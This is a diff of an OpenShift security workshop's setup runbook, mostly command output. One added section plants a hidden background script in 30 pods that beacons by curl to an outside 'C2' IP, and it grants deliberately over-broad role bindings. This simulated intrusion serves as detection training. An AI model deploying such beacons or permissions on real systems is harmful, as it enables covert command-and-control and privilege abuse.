-deployment.apps/edge-server unchanged
-service/edge-server unchanged
-deployment.apps/socketio-server unchanged
-service/socketio-server unchanged
-route.route.openshift.io/edge-server unchanged
-route.route.openshift.io/socketio-server unchanged
-namespace/vulnerable-workload-3 unchanged
-deployment.apps/message-broker unchanged
-service/message-broker unchanged
-deployment.apps/edge-server unchanged
-service/edge-server unchanged
-deployment.apps/socketio-server configured
-service/socketio-server unchanged
-route.route.openshift.io/edge-server unchanged
-route.route.openshift.io/socketio-server unchanged
-namespace/vulnerable-workload-4 unchanged
-deployment.apps/message-broker unchanged
-service/message-broker unchanged
-deployment.apps/edge-server unchanged
-service/edge-server unchanged
-deployment.apps/socketio-server configured
-service/socketio-server unchanged
-route.route.openshift.io/edge-server unchanged
-route.route.openshift.io/socketio-server unchanged
-namespace/vulnerable-workload-5 unchanged
-deployment.apps/message-broker unchanged
-service/message-broker unchanged
-deployment.apps/edge-server unchanged
-service/edge-server unchanged
-deployment.apps/socketio-server unchanged
-service/socketio-server unchanged
-route.route.openshift.io/edge-server unchanged
-route.route.openshift.io/socketio-server unchanged
+namespace/vulnerable-workload-1 created
+deployment.apps/message-broker created
+service/message-broker created
+deployment.apps/edge-server created
+service/edge-server created
+deployment.apps/socketio-server created
+service/socketio-server created
+route.route.openshift.io/edge-server created
+route.route.openshift.io/socketio-server created
+namespace/vulnerable-workload-2 created
+deployment.apps/message-broker created
+service/message-broker created
+deployment.apps/edge-server created
+service/edge-server created
+deployment.apps/socketio-server created
+service/socketio-server created
+route.route.openshift.io/edge-server created
+route.route.openshift.io/socketio-server created
+namespace/vulnerable-workload-3 created
+deployment.apps/message-broker created
+service/message-broker created
+deployment.apps/edge-server created
+service/edge-server created
+deployment.apps/socketio-server created
+service/socketio-server created
+route.route.openshift.io/edge-server created
+route.route.openshift.io/socketio-server created
+namespace/vulnerable-workload-4 created
+deployment.apps/message-broker created
+service/message-broker created
+deployment.apps/edge-server created
+service/edge-server created
+deployment.apps/socketio-server created
+service/socketio-server created
+route.route.openshift.io/edge-server created
+route.route.openshift.io/socketio-server created
+namespace/vulnerable-workload-5 created
+deployment.apps/message-broker created
+service/message-broker created
+deployment.apps/edge-server created
+service/edge-server created
+deployment.apps/socketio-server created
+service/socketio-server created
+route.route.openshift.io/edge-server created
+route.route.openshift.io/socketio-server created
 namespace/vulnerable-workload-6 created
 deployment.apps/message-broker created
 service/message-broker created
@@ -910,6 +418,497 @@ route.route.openshift.io/socketio-server created
 #+end_example
 
 
+* Deploy exercise 2 & 3 compromised workloads
+
+For the purposes of exercise 2 we need an existing project and demo workload for each workshop user.
+
+We'll create the required ~Project~, ~Pod~ and ~ServiceAccount~ by hydrating an OpenShift ~Template~, then carry out the exploit with a bash script once the pods are up.
+
+The ~setup/app-template.yaml~ file also handles the various permissions each workshop attendee requires.
+
+#+NAME: Deploy compromised workloads
+#+begin_src bash
+echo "Applying template for each attendee"
+for i in $(seq 1 30); do
+
+  # Clean up any pre-existing exploited pod
+  oc delete pod -l app=payment-gateway --namespace="payment-gateway-${i}" --grace-period=0 --force 2>/dev/null || true
+  oc wait --for=delete pod -l app=payment-gateway --namespace="payment-gateway-${i}" --timeout=30s 2>/dev/null || true
+
+  # Hydrate the new pod and supporting resources
+  oc process --filename setup/app-template.yaml --param SUFFIX=$i | oc apply --filename -
+done
+
+echo "Waiting for all payment-gateway pods to initialize..."
+oc wait --for=condition=Ready pods --selector app=payment-gateway --all-namespaces --timeout=90s
+
+echo "Simulating live 'oc exec' intrusion across environments..."
+for i in $(seq 1 30); do
+  namespace="payment-gateway-$i"
+
+  # Request a short lived token for our new cicd service account in this namespace
+  token=$(oc create token cicd-pipeline-runner-sa --namespace "${namespace}")
+
+  # Executing the exploit payload dynamically using explicit parameter names
+  oc exec pod/payment-gateway \
+    --namespace "${namespace}" \
+    --token "${token}" \
+    --container httpd \
+    -- sh -c '
+      export C2_SERVER="185.199.108.153"
+      export CODENAME="SHADOW_PIVOT"
+      export ENV_MARKER="ACME_SECRET_KEY_EXFIL_TEST_9921"
+
+      mkdir -p /tmp/.hidden_toolkit
+
+      # Build a script that actively beacons out to the C2 server every 10 seconds
+      cat << "EOF" > /tmp/.hidden_toolkit/exfil.sh
+#!/bin/sh
+while true; do
+  curl --silent --max-time 2 --output /dev/null \
+    --header "X-Agent-ID: SHADOW_PIVOT" \
+    --header "X-Target-Namespace: payment-gateway" \
+    "http://185.199.108.153/api/v1/beacon"
+
+  sleep 30
+done
+EOF
+
+      chmod +x /tmp/.hidden_toolkit/exfil.sh
+      /tmp/.hidden_toolkit/exfil.sh > /dev/null 2>&1 &
+    '
+  echo "[+] Namespace ${namespace} weaponized via simulated session execution."
+done
+#+end_src
+
+#+RESULTS: Deploy compromised workloads
+#+begin_example
+Applying template for each attendee
+No resources found
+project.project.openshift.io/payment-gateway-1 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-1 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-1 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-2 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-2 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-2 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-3 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-3 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-3 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-4 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-4 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-4 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-5 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-5 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-5 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-6 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-6 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-6 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-7 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-7 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-7 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-8 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-8 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-8 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-9 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-9 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-9 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-10 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-10 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-10 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-11 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-11 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-11 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-12 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-12 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-12 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-13 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-13 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-13 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-14 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-14 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-14 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-15 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-15 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-15 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-16 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-16 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-16 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-17 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-17 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-17 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-18 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-18 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-18 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-19 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-19 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-19 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-20 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-20 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-20 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-21 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-21 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-21 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-22 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-22 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-22 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-23 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-23 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-23 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-24 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-24 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-24 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-25 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-25 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-25 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-26 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-26 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-26 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-27 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-27 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-27 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-28 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-28 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-28 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-29 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-29 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-29 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+No resources found
+project.project.openshift.io/payment-gateway-30 created
+pod/payment-gateway created
+serviceaccount/cicd-pipeline-runner-sa created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding created
+role.rbac.authorization.k8s.io/container-executor created
+rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-30 created
+clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-30 created
+rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding created
+Waiting for all payment-gateway pods to initialize...
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+pod/payment-gateway condition met
+Simulating live 'oc exec' intrusion across environments...
+[+] Namespace payment-gateway-1 weaponized via simulated session execution.
+[+] Namespace payment-gateway-2 weaponized via simulated session execution.
+[+] Namespace payment-gateway-3 weaponized via simulated session execution.
+[+] Namespace payment-gateway-4 weaponized via simulated session execution.
+[+] Namespace payment-gateway-5 weaponized via simulated session execution.
+[+] Namespace payment-gateway-6 weaponized via simulated session execution.
+[+] Namespace payment-gateway-7 weaponized via simulated session execution.
+[+] Namespace payment-gateway-8 weaponized via simulated session execution.
+[+] Namespace payment-gateway-9 weaponized via simulated session execution.
+[+] Namespace payment-gateway-10 weaponized via simulated session execution.
+[+] Namespace payment-gateway-11 weaponized via simulated session execution.
+[+] Namespace payment-gateway-12 weaponized via simulated session execution.
+[+] Namespace payment-gateway-13 weaponized via simulated session execution.
+[+] Namespace payment-gateway-14 weaponized via simulated session execution.
+[+] Namespace payment-gateway-15 weaponized via simulated session execution.
+[+] Namespace payment-gateway-16 weaponized via simulated session execution.
+[+] Namespace payment-gateway-17 weaponized via simulated session execution.
+[+] Namespace payment-gateway-18 weaponized via simulated session execution.
+[+] Namespace payment-gateway-19 weaponized via simulated session execution.
+[+] Namespace payment-gateway-20 weaponized via simulated session execution.
+[+] Namespace payment-gateway-21 weaponized via simulated session execution.
+[+] Namespace payment-gateway-22 weaponized via simulated session execution.
+[+] Namespace payment-gateway-23 weaponized via simulated session execution.
+[+] Namespace payment-gateway-24 weaponized via simulated session execution.
+[+] Namespace payment-gateway-25 weaponized via simulated session execution.
+[+] Namespace payment-gateway-26 weaponized via simulated session execution.
+[+] Namespace payment-gateway-27 weaponized via simulated session execution.
+[+] Namespace payment-gateway-28 weaponized via simulated session execution.
+[+] Namespace payment-gateway-29 weaponized via simulated session execution.
+[+] Namespace payment-gateway-30 weaponized via simulated session execution.
+#+end_example
+
+
 * Install web terminal operator
 
 Participants are going to use the OpenShift Web Terminal to run commands in order to avoid having to do anything locally on their devices.
@@ -956,11 +955,6 @@ data:
         enabled: ENABLED
 EOF
 #+end_src
-
-#+RESULTS: Enable rhacs externalip
-#+begin_example
-configmap/collector-config created
-#+end_example
 
 
 * Enable creating criu checkpoints
@@ -1025,7 +1019,6 @@ EOF
 
 #+RESULTS: Create bucket
 #+begin_example
-objectbucketclaim.objectbucket.io/workshop-assets created
 #+end_example
 
 
